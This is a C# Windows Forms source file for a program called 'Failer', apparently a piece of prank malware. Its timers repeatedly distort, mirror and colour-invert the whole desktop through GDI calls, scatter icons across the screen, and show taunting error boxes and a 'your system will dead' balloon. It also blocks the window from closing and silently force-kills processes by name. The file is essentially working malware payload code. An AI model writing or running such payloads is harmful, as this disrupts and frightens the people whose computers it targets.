using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Failer
{
    public partial class Failer_LAST : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }

        Random r;

        private void Failer_LAST_Load(object sender, EventArgs e)
        {
            timer1.Start();
            timer3.Start();
            timer4.Start();
            timer5.Start();
            timer6.Start();
            timer7.Start();
        }
        public Failer_LAST()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }
        private void Failer_LAST_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
            r = new Random();
            if (timer1.Interval > 101)
            {
                timer1.Interval -= 30;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else if (timer1.Interval > 51)
            {
                timer1.Interval -= 10;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else
            {
                timer1.Interval = 40;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);

            }
            timer1.Start();
        }
        private void timer2_Tick(object sender, EventArgs e)
        {
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            timer3.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer3.Interval = r.Next(5000);
            timer3.Start();
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            timer4.Stop();
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer4.Interval = r.Next(1000);
            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); // for erase hdc(graphics payloads)
            timer4.Start();
        }
        private const int SWP_NOZORDER = 0x4;
        private const int SWP_NOSIZE = 0x1;
        private const int SWP_SHOWWINDOW = 0x40;

        [DllImport("user32.dll", EntryPoint = "FindWindow")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        private void timer5_Tick(object sender, EventArgs e)
        {
            Random random = new Random();
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            int posX = random.Next(Screen.PrimaryScreen.Bounds.Width);
            int posY = random.Next(Screen.PrimaryScreen.Bounds.Height);

            MessageBox.Show("Still using this computer? lol", "Failer", MessageBoxButtons.OK, MessageBoxIcon.Error, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000);
            IntPtr mbWnd = FindWindow(null, "Failer");
            SetWindowPos(mbWnd, IntPtr.Zero, posX, posY, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
        }

        private Random randomFuck = new Random();
        private void timer6_Tick(object sender, EventArgs e)
        {
            timer6.Stop();

            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(Extract("shell32.dll", 235, true), randomFuck.Next(Screen.PrimaryScreen.Bounds.Width), randomFuck.Next(Screen.PrimaryScreen.Bounds.Height));
            }

            timer6.Start();
        }

        private void timer7_Tick(object sender, EventArgs e)
        {
            string processName = Process.GetCurrentProcess().ProcessName;

            Process[] processes = Process.GetProcessesByName(processName);
            foreach (Process process in processes)
            {
                //Configure the process to start without displaying a window
                ProcessStartInfo psi = new ProcessStartInfo("taskkill", $"/F /IM {process.ProcessName}.exe");
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;

                //Start the process
                Process.Start(psi);
            }
        }
        private NotifyIcon notifyIcon;

        private void timer8_Tick(object sender, EventArgs e)
        {
            // 메시지를 띄우기 위해서는 시스템 트레이 아이콘을 표시해야 함
            notifyIcon.Visible = true;
            notifyIcon.ShowBalloonTip(10000); // 10초간 메시지 띄우기

            notifyIcon = new NotifyIcon();
            notifyIcon.Icon = SystemIcons.Information;
            notifyIcon.BalloonTipTitle = "Failer.exe";
            notifyIcon.BalloonTipText = "your system will dead! :D";
            notifyIcon.BalloonTipIcon = ToolTipIcon.None;
        }
    }
}
